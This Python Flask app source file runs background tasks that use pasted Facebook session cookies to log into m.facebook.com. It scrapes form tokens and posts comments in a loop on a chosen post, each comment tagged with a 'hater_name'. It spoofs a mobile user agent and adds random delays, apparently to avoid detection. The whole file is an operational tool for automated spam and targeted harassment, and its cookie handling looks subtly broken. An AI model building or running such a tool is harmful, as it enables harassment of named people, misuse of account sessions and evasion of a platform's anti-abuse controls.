from flask import Flask, render_template, request, jsonify
import requests
import re
import time
import threading
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)

# Global variables to manage tasks
active_tasks = {}
task_lock = threading.Lock()

class FacebookCommenter:
    def __init__(self, task_id):
        self.task_id = task_id
        self.comment_count = 0
        self.start_time = datetime.now()
        self.is_running = True
        self.last_status = "Initializing"
        
    def stop_task(self):
        self.is_running = False
        
    def get_status(self):
        return {
            "status": "running" if self.is_running else "stopped",
            "comment_count": self.comment_count,
            "uptime": str(datetime.now() - self.start_time),
            "last_status": self.last_status,
            "task_id": self.task_id
        }
    
    def clean_cookies(self, cookie_str):
        """Clean and extract essential cookies"""
        essential = ['sb', 'datr', 'c_user', 'xs', 'fr']
        cookies = {}
        
        # Remove problematic characters
        clean = re.sub(r'[\[\]\{\}"\']', '', cookie_str)
        
        # Extract key-value pairs
        for part in clean.split(';'):
            if '=' in part:
                key, val = part.split('=', 1)
                key = key.strip()
                if key in essential:
                    cookies[key] = val.split()[0].strip()
        
        return "; ".join(f"{k}={v}" for k,v in cookies.items()) if cookies else None

    def verify_cookies(self, cookies):
        """Verify cookies with m.facebook.com"""
        try:
            cleaned = self.clean_cookies(cookies)
            if not cleaned:
                return False
                
            sess = requests.Session()
            sess.cookies.update({"cookie": cleaned})
            sess.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
            })
            
            resp = sess.get(
                "https://m.facebook.com/home.php", 
                timeout=10,
                allow_redirects=False
            )
            return resp.status_code == 200 and 'c_user' in sess.cookies.get_dict()
        except:
            return False

    def extract_post_id(self, url):
        """Extract post ID from any Facebook URL format"""
        patterns = [
            r'/posts/([^/?]+)',
            r'story_fbid=([0-9]+)',
            r'/(\d+)/?$',
            r'fbid=([0-9]+)',
            r'permalink/([0-9]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        return None

    def send_comment(self, cookies, post_url, comment_text, hater_name, last_name):
        try:
            # Verify cookies
            cleaned_cookies = self.clean_cookies(cookies)
            if not cleaned_cookies or not self.verify_cookies(cleaned_cookies):
                self.last_status = "Invalid cookies"
                return False

            # Extract post ID
            post_id = self.extract_post_id(post_url)
            if not post_id:
                self.last_status = "Invalid post URL"
                return False

            session = requests.Session()
            session.cookies.update({"cookie": cleaned_cookies})
            session.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
                "Referer": f"https://m.facebook.com/{post_id}",
                "Origin": "https://m.facebook.com"
            })

            # Load post page
            response = session.get(f"https://m.facebook.com/{post_id}")
            
            # Extract comment form parameters
            fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
            jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
            
            if not fb_dtsg or not jazoest:
                self.last_status = "Comment form not found"
                return False

            # Submit comment
            formatted_comment = f"{hater_name} {comment_text.strip()} {last_name}"
            response = session.post(
                "https://m.facebook.com/a/comment.php",
                data={
                    "fb_dtsg": fb_dtsg.group(1),
                    "jazoest": jazoest.group(1),
                    "comment_text": formatted_comment
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"}
            )

            if response.status_code == 200:
                self.comment_count += 1
                self.last_status = f"Posted: {formatted_comment}"
                return True
            else:
                self.last_status = f"Failed (Status: {response.status_code})"
                return False

        except Exception as e:
            self.last_status = f"Error: {str(e)}"
            return False

    def run_task(self, config):
        try:
            cookies = config['cookies']
            post_url = config['post_url']
            comments = config['comments']
            delay = config['delay']
            hater_name = config['hater_name']
            last_name = config['last_name']
            
            comment_index = 0
            
            while self.is_running:
                current_comment = comments[comment_index % len(comments)]
                
                success = self.send_comment(
                    cookies,
                    post_url,
                    current_comment,
                    hater_name,
                    last_name
                )
                
                if success:
                    comment_index += 1
                
                time.sleep(delay + random.uniform(1, 3))  # Random delay
                
        except Exception as e:
            self.last_status = f"Task Error: {str(e)}"
        finally:
            with task_lock:
                if self.task_id in active_tasks:
                    del active_tasks[self.task_id]

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        # Handle both JSON and form data
        data = request.get_json() if request.is_json else request.form
        
        # Validate required fields
        required = ['cookies', 'post_url', 'hater_name', 'last_name', 'comments', 'delay']
        if not all(data.get(field) for field in required):
            return jsonify({'status': 'error', 'message': 'All fields are required'}), 400
        
        # Verify cookies
        commenter = FacebookCommenter('verify')
        if not commenter.verify_cookies(data['cookies']):
            return jsonify({'status': 'error', 'message': 'Invalid cookies - login failed'}), 401
        
        # Create task
        task_id = ''.join(random.choices(string.digits, k=8))
        config = {
            'cookies': data['cookies'],
            'post_url': data['post_url'],
            'hater_name': data['hater_name'],
            'last_name': data['last_name'],
            'comments': [c.strip() for c in data['comments'].split('\n') if c.strip()],
            'delay': max(5, int(data['delay']))
        }
        
        # Start task
        commenter = FacebookCommenter(task_id)
        thread = threading.Thread(target=commenter.run_task, args=(config,))
        thread.daemon = True
        thread.start()
        
        with task_lock:
            active_tasks[task_id] = commenter
        
        return jsonify({
            'status': 'success',
            'task_id': task_id,
            'message': 'Task started successfully'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stop_task/<task_id>', methods=['POST'])
def stop_task(task_id):
    with task_lock:
        if task_id in active_tasks:
            active_tasks[task_id].stop_task()
            return jsonify({'status': 'success', 'message': 'Task stopped'})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/task_status/<task_id>')
def task_status(task_id):
    with task_lock:
        if task_id in active_tasks:
            return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
        return jsonify({'status': 'error', 'message': 'Task not found'})

@app.route('/active_tasks')
def get_active_tasks():
    with task_lock:
        return jsonify({
            'status': 'success',
            'data': {task_id: task.get_status() for task_id, task in active_tasks.items()}
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
